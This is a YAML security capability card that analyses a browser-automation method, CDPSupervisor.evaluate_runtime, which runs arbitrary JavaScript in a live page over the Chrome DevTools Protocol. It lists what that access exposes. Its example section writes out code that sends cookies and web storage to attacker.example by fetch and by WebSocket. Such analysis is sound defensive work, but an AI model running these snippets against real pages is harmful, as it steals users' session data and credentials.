# CDPSupervisor.evaluate_runtime

```yaml
schema_version: sink-capability-card/v2
card_id: SCC-ae624662a5326b4f
api: CDPSupervisor.evaluate_runtime
api_family: supervisor.evaluate_runtime
runtime:
  language: python
  ecosystem: project-source
  package: supervisor
  version: legacy-source-bound
capability_class: code-eval
normative_authority: capability-facts-only
bound_sinks:
- Chrome DevTools Protocol Runtime.evaluate (CDP)
roles:
- role_id: code
  description: Legacy controlled role code.
  bindings:
  - expression: expression
    caller_bindable: true
facets:
- facet_id: legacy-facet-49a52b1e
  capability: Execute arbitrary JavaScript in the live browser page's main execution context (the inspected page's top-level realm), with full access to the page's global scope, DOM, and all browser Web APIs.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-a5f87a77
  capability: Access and mutate the DOM (document.querySelector*, innerHTML, createElement, etc.) — read, modify, or inject any visible or hidden page content.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-d390d084
  capability: Read `document.cookie` — exfiltrates all non-HttpOnly cookies for the page's origin.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-4f403ae7
  capability: Read and write `localStorage` and `sessionStorage` — full read/write access to all origin-scoped storage.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-7d4d9909
  capability: Access all JavaScript global variables, functions, and objects defined by the page — read secrets, tokens, API keys, user data held in JS memory.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-33dede1b
  capability: 'Issue outbound HTTP requests via `fetch()` and `XMLHttpRequest` — the expression can make same-origin or cross-origin requests (subject to the page''s CORS-preflight model at the browser level, but the expression runs in the page''s own origin context so same-origin requests succeed unconditionally). Response bodies are accessible when `awaitPromise: true` (the default) is paired with `returnByValue: true`.'
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-0da4d1d3
  capability: Open WebSocket connections to arbitrary hosts via `new WebSocket(url)` — the expression can establish persistent outbound channels from the victim browser.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-cae71cc6
  capability: Use `navigator.sendBeacon(url, data)` for fire-and-forget data exfiltration to arbitrary origins.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-24dc9059
  capability: Access clipboard (read/write) and fullscreen APIs — `userGesture` is hardcoded `True` in the CDP call, satisfying user-activation requirements for these sensitive APIs.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-dc8be103
  capability: Navigate the page via `location.href = ...` or `location.replace(...)` — redirect the user to an attacker-controlled page.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-7d52feb7
  capability: Access `window.name`, `history`, `history.pushState`, `history.replaceState` — manipulate cross-navigation state.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-e1cfd07f
  capability: Dynamically create DOM elements including `<iframe>`, `<script>`, `<link>`, `<img>` — inject content, load external resources, trigger outbound requests through side channels.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-6d0a072d
  capability: Access IndexedDB — read/write all IndexedDB databases scoped to the page's origin.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-e86cd69c
  capability: Access Cache API (`caches`) — read/write cached responses for the origin.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-888579e6
  capability: Access Service Worker registrations via `navigator.serviceWorker` — enumerate, unregister, or interact with registered service workers.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-9fad2079
  capability: Access `navigator.mediaDevices` — enumerate cameras/microphones (gUM still requires per-origin permission grant in the browser, but enumeration may succeed).
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-203d1be1
  capability: Use dynamic `import()` — if the page's CSP and origin permit ES module imports, the expression can load and execute arbitrary remote JavaScript modules.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-508f308f
  capability: Multi-statement execution — the `expression` string is not restricted to a single expression; it can be a full script (statements, function definitions, loops, try/catch, async/await).
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-1b544ef5
  capability: The expression can define functions and call them inline — arbitrary program logic within the evaluated string.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-cd3d8dad
  capability: Access the CDP `Runtime.evaluate` `objectGroup`-free evaluation — objects returned by value are deep-serialized via JSON, enabling structured data extraction back to the Python caller.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-4f11fa51
  capability: The evaluation context is the `page` session (the browser tab the supervisor is attached to) — if the supervisor is attached to a sensitive internal application, the expression executes with that application's full origin authority.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-810c2662
  capability: 'Await promises transparently — `awaitPromise: True` (default) means `fetch(url).then(r => r.json())` or any async expression resolves fully before the CDP response is returned.'
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
- facet_id: legacy-facet-5a1eba21
  capability: Retry-on-serialization-failure with `returnByValue=False` fallback — if deep-serialization fails (e.g., circular references), the implementation retries with description-only mode, still returning the object's string representation, so partial data extraction survives serialization errors.
  role_ids:
  - code
  activation:
    any_of:
    - predicate: role-bound
      subject: code
      operator: equals
      value: true
library_guarantees: []
defaults:
- default_id: legacy-default-b52d1af0
  role_id: null
  value: '`userGesture` is hardcoded `True` in every call — user-activation-gated browser APIs (clipboard read/write, fullscreen request, audio playback, etc.) are always available regardless of whether a real user gesture occurred.'
  security_effect: '`userGesture` is hardcoded `True` in every call — user-activation-gated browser APIs (clipboard read/write, fullscreen request, audio playback, etc.) are always available regardless of whether a real user gesture occurred.'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-745bcd7e
  role_id: null
  value: '`awaitPromise` defaults to `True` — async operations complete before the result is returned; no explicit `.then()` chaining needed by the attacker.'
  security_effect: '`awaitPromise` defaults to `True` — async operations complete before the result is returned; no explicit `.then()` chaining needed by the attacker.'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-96fba5df
  role_id: null
  value: '`returnByValue` defaults to `True` — the browser deep-serializes the result via JSON; data is extracted from the page back to the Python caller without the attacker needing to craft an exfiltration channel.'
  security_effect: '`returnByValue` defaults to `True` — the browser deep-serializes the result via JSON; data is extracted from the page back to the Python caller without the attacker needing to craft an exfiltration channel.'
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-7ce70d35
  role_id: null
  value: The evaluation runs in the **page** execution context (not an isolated world) — the expression shares the same JavaScript realm as the page's own scripts, so all page globals, prototypes, and monkey-patches are visible.
  security_effect: The evaluation runs in the **page** execution context (not an isolated world) — the expression shares the same JavaScript realm as the page's own scripts, so all page globals, prototypes, and monkey-patches are visible.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-a33459b5
  role_id: null
  value: The CDP command is sent over the supervisor's already-connected WebSocket — zero subprocess startup, zero connection setup; the expression is evaluated immediately in the live browser.
  security_effect: The CDP command is sent over the supervisor's already-connected WebSocket — zero subprocess startup, zero connection setup; the expression is evaluated immediately in the live browser.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-2cd10f49
  role_id: null
  value: The CDP `Runtime.evaluate` `contextId` is NOT specified — the expression defaults to the page's main execution context (the top-level frame's default realm), not a sandboxed or isolated context.
  security_effect: The CDP `Runtime.evaluate` `contextId` is NOT specified — the expression defaults to the page's main execution context (the top-level frame's default realm), not a sandboxed or isolated context.
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
- default_id: legacy-default-666f0b6e
  role_id: null
  value: The expression is not wrapped in any sandbox, proxy, or `with` statement — it executes directly against the global object (`window` / `globalThis`).
  security_effect: The expression is not wrapped in any sandbox, proxy, or `with` statement — it executes directly against the global object (`window` / `globalThis`).
  activation:
    all_of:
    - predicate: always
      subject: legacy-default
      operator: equals
      value: true
example_usage:
  benign: '# Read the page title (normal automation use)

    result = supervisor.evaluate_runtime("document.title")

    # -> {"ok": True, "result": "My Dashboard", "result_type": "string"}

    '
  capability_edge: "# Read all non-HttpOnly cookies and localStorage, then exfiltrate via fetch\nresult = supervisor.evaluate_runtime(\"\"\"\n  (async () => {\n    const data = {\n      cookies: document.cookie,\n      localStorage: JSON.stringify(localStorage),\n      sessionStorage: JSON.stringify(sessionStorage),\n      location: location.href\n    };\n    await fetch('https://attacker.example/collect', {\n      method: 'POST',\n      body: JSON.stringify(data)\n    });\n    return 'exfiltrated';\n  })()\n\"\"\")\n# -> {\"ok\": True, \"result\": \"exfiltrated\", \"result_type\": \"string\"}\n\n# Use clipboard (userGesture: True makes this work)\nresult = supervisor.evaluate_runtime(\"navigator.clipboard.readText()\")\n\n# Open a WebSocket to an attacker-controlled server from the victim origin\nresult = supervisor.evaluate_runtime(\"\"\"\n  (() => {\n    const ws = new WebSocket('wss://attacker.example/socket');\n    ws.onopen = () => ws.send(document.cookie);\n    return 'socket opened';\n\
    \  })()\n\"\"\")\n"
provenance:
- /root/project/xclaw-project/hermes-agent/tools/browser_supervisor.py:465-567 (evaluate_runtime implementation)
- /root/project/xclaw-project/hermes-agent/tools/browser_supervisor.py:785-809 (_cdp WebSocket transport — sends CDP command as JSON over live WebSocket)
- '{''/root/project/xclaw-project/hermes-agent/tools/browser_supervisor.py:502-508 (CDP Runtime.evaluate parameters'': ''expression, returnByValue, awaitPromise, userGesture=True, sessionId)''}'
- '{''CWE-95'': ''Improper Neutralization of Directives in Dynamically Evaluated Code (Eval Injection)''}'
- '{''CDP Runtime.evaluate specification'': ''https://chromedevtools.github.io/devtools-protocol/tot/Runtime/#method-evaluate''}'
```
